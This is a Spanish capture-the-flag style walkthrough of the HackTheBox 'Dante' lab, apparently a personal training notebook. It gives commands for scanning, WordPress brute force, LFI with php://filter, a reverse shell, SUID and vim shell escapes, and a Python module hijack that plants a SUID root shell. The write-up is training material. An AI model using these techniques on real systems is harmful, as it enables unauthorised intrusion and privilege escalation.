---
hidden: true
---

# Dante

## I'm nuts and bolts about you

Vemos qué hosts están activos.

```
nmap -sn -T4 10.10.110.0/24 -o hosts_activos
```

<figure><img src="../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>

Realizamos escaneo completo para ver las versiones y servicios.

```
nmap -T4 -sC -sV -p- --min-rate=1000 10.10.110.100
```

<figure><img src="../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>

Vemos que tenemos varios puertos pero vamos a ir poco a poco. Primero miramos el puerto **FTP** que tenemos acceso con **anonymous**.

```
ftp 10.10.110.100
```

<figure><img src="../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>

Vemos el contenido de lo descargado.

<figure><img src="../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>

Tenemos estas pistas para los siguientes pasos. Vemos a ver el contenido del puerto **65000**.

<figure><img src="../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>

## It's easier this way

Conseguimos la bandera pero vemos hay un wordpress corriendo así que vamos allá.

<figure><img src="../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>

Realizamos un escaneo con WPScan.

```
wpscan --url http://10.10.110.100:65000/wordpress --enumerate vp
```

<figure><img src="../.gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>

Usa versión desactualizada por lo que tendrá alguna vulnerabilidad. Miramos los usuarios.

```
wpscan --url http://10.10.110.100:65000/wordpress --enumerate u
```

<figure><img src="../.gitbook/assets/Captura de pantalla 2025-10-13 101357.png" alt=""><figcaption></figcaption></figure>

Realizamos fuera bruta para sonsacar la contraseña con rockyou y esos usuarios.

```
wpscan --url http://10.10.110.100:65000/wordpress --usernames usuarios --passwords rockyou.txt
```

Tras haberla sacado nos logueamos (james:Toyota).

<figure><img src="../.gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>

James tiene rol de administrador. Como vimos antes en la temática que usan podemos realizar una Reverse Shell editando un archivo.

<figure><img src="../.gitbook/assets/image (10).png" alt=""><figcaption></figcaption></figure>

Nos ponemos en escucha.

<figure><img src="../.gitbook/assets/image (11).png" alt=""><figcaption></figcaption></figure>

Hacemos tratamiento de TTY.

```
script /dev/null -c bash
CTRL+Z
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=bash
```

Nos logueamos con las mismas credenciales de **james**.

<figure><img src="../.gitbook/assets/image (12).png" alt=""><figcaption></figcaption></figure>

## Show me the way

No tenemos permisos SUDO por lo que miramos SUID.

```
find / -perm -4000 2>/dev/null
```

<figure><img src="../.gitbook/assets/image (14).png" alt=""><figcaption></figcaption></figure>

{% embed url="https://gtfobins.github.io/gtfobins/find/" %}

Miramos el contenido de archivos interesantes.

<figure><img src="../.gitbook/assets/image (13).png" alt=""><figcaption></figcaption></figure>

## Seclusion is an illusion

Si hacemos `ifconfig` vemos que tenemos una subret por lo que miramos cuales están activos.

```
for i in {1..255} ;do (ping -c 1 172.16.1.$i | grep "bytes from"|cut -d ' ' -f4|tr -d ':' &);done
```

<figure><img src="../.gitbook/assets/image (15).png" alt=""><figcaption></figcaption></figure>

Vamos a mirar que servicios corren para ello lo hacemos con proxychains.

<figure><img src="../.gitbook/assets/image (19).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (16).png" alt=""><figcaption></figcaption></figure>

Si navegamos entre las secciones vemos el parámetro `?page` por lo que siguiendo la pista que nos dejaron antes ahí estará el **LFI**.

<figure><img src="../.gitbook/assets/image (18).png" alt=""><figcaption></figcaption></figure>

Vemos dos usuarios que son frank y margaret. Nos conectamos por SMB.

<figure><img src="../.gitbook/assets/image (20).png" alt=""><figcaption></figcaption></figure>

Vemos que nos podemos conectar sin contraseña.

<figure><img src="../.gitbook/assets/image (21).png" alt=""><figcaption></figcaption></figure>

Vamos a ver la pista del WP.

<figure><img src="../.gitbook/assets/image (22).png" alt=""><figcaption></figcaption></figure>

Así que estará en la ruta del root.

<figure><img src="../.gitbook/assets/Captura de pantalla 2025-10-13 125655.png" alt=""><figcaption></figcaption></figure>

Parece que el CMS de WordPress no es accesible directamente. Podría ser que WordPress esté instalado en el directorio raíz del servidor web `/var/www/html/`, mientras que la aplicación "Dante Hosting" se sirve desde un subdirectorio. Vamos a confirmar esto accediendo al archivo `/var/www/html/index.html` usando la vulnerabilidad LFI (Local File Inclusion).

Podemos ver que la página predeterminada de Apache está presente en la raíz del servidor web. Vamos a intentar cargar la página `index.php` de WordPress.

El mensaje de error confirma que WordPress está instalado en la raíz del servidor. En general, WordPress almacena la configuración de la base de datos en el archivo `wp-config.php`.

PHP ofrece diversos _wrappers_ (envoltorios) que pueden usarse para acceder fácilmente a archivos, protocolos o flujos de datos. Una lista completa de estos _wrappers_ puede encontrarse [aquí](https://www.php.net/wrappers). El _wrapper_ `php://` está habilitado por defecto y se usa para interactuar con los flujos de entrada y salida (IO).

Por ejemplo: `php://stdin` y `php://stdout` se usan para acceder a los flujos de entrada y salida del proceso, mientras que `php://input` y `php://output` se usan para acceder a los datos de la solicitud.

Un _wrapper_ útil es `php://filter`, el cual puede encadenarse con múltiples filtros para obtener el tipo de salida deseado.

Vamos a decodificarlo.

<figure><img src="../.gitbook/assets/Captura de pantalla 2025-10-13 130653.png" alt=""><figcaption></figcaption></figure>

Vienen unas credenciales de margaret vamos a intentar por SSH.

```
proxychains ssh margaret@172.16.1.10
```

Vemos que tenemos una shell restringida pero está vim.

{% embed url="https://gtfobins.github.io/gtfobins/vim/" %}

<figure><img src="../.gitbook/assets/image (1716).png" alt=""><figcaption></figcaption></figure>

## Snake it 'til you make it

Se encontró un directorio `.config/Slack` en el home del usuario, lo que concuerda con una tarea pendiente relacionada con la integración de Slack.

Slack suele guardar datos del usuario en `~/.config/Slack`. Si un administrador exporta los datos del workspace, se guardan en formato **JSON**.

<figure><img src="../.gitbook/assets/image (1717).png" alt=""><figcaption></figcaption></figure>

Cambiamos al usuario Frank con esa contraseña. Vemos que contiene un archivo.

<figure><img src="../.gitbook/assets/image (1718).png" alt=""><figcaption></figcaption></figure>

Ejecutamos **pspy**.

<figure><img src="../.gitbook/assets/image (1719).png" alt=""><figcaption></figcaption></figure>

La salida de **pspy** revela que **root** ejecuta el script cada minuto. El script no es escribible por **frank**, aunque importa los módulos `call` y `urllib`. Python dispone de una lista de rutas de búsqueda para sus librerías. Esto puede verse ejecutando los siguientes comandos.

```
>>> import sys
>>> sys.path
['', '/usr/lib/python2.7', '/usr/lib/python2.7/plat-x86_64-linux-gnu',
'/usr/lib/python2.7/lib-tk', '/usr/lib/python2.7/lib-old',
'/usr/lib/python2.7/lib-dynload', '/usr/local/lib/python2.7/dist-packages',
'/usr/lib/python2.7/dist-packages']
```

Python primero comprueba los módulos en el directorio de trabajo actual, antes de mirar en las demás rutas. Podemos intentar secuestrar la carga de los módulos legítimos `call` o `urllib`, de modo que en su lugar se cargue nuestro módulo malicioso. Creemos un archivo `urllib.py` en la carpeta `/home/frank` con el contenido que aparece a continuación.

```
import os
os.system("cp /bin/sh /tmp/sh;chmod u+s /tmp/sh")
```

<figure><img src="../.gitbook/assets/image (1720).png" alt=""><figcaption></figcaption></figure>

Miramos la flag `/root/flag.txt`

## Feeling fintastic

